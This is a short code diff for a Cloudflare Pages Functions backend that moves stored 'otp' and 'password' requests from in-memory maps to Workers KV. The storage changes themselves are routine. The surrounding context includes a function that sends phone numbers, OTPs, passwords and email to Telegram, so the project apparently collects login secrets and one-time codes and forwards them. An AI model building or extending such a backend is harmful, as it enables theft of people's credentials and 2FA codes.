@@ -1,7 +1,5 @@
 // Shared logic for Cloudflare Pages Functions backend
-// NOTE: In-memory storage is ephemeral and not suitable for production; for durability, replace with Workers KV or D1.
-const otpRequests = new Map();
-const passwordRequests = new Map();
+// Uses Workers KV for persistent storage across requests
 
 function makeJsonResponse(data, status = 200) {
   return new Response(JSON.stringify(data), {
@@ -95,10 +93,18 @@ async function sendTelegramNotification({ requestId, phone, otp, password, email
   }
 }
 
-function getDataStore(type) {
-  if (type === "otp") return otpRequests;
-  if (type === "password") return passwordRequests;
-  throw new Error(`Unsupported type: ${type}`);
+// KV storage functions
+async function getRequestFromKV(env, requestId, type = "otp") {
+  const key = `${type}:${requestId}`;
+  const data = await env.REQUESTS_KV.get(key);
+  return data ? JSON.parse(data) : null;
+}
+
+async function setRequestInKV(env, requestId, data, type = "otp") {
+  const key = `${type}:${requestId}`;
+  await env.REQUESTS_KV.put(key, JSON.stringify(data), {
+    expirationTtl: 3600, // 1 hour expiration
+  });
 }
 
 export {
@@ -106,7 +112,6 @@ export {
   makeTextResponse,
   uuidv4,
   sendTelegramNotification,
-  getDataStore,
-  otpRequests,
-  passwordRequests,
+  getRequestFromKV,
+  setRequestInKV,
 };
